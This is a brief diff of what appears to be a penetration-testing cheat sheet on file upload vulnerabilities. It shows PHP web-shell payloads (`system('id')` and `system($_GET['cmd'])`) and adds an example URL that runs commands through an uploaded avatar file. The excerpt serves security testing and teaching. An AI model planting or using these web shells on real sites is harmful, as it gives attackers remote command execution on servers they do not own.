@@ -4,7 +4,7 @@ You should always test for file upload vulnerabilities by trying to upload simpl
   
     <?php system('id') ?>
   
-    <?php system($_GET['cmd']); ?>
+    <?php system($_GET['cmd']); ?>       to get the file http://site.com/files/avatars/profile.jpg?cmd=ls
 
 ## Via Common php file extensions:
 1. .php
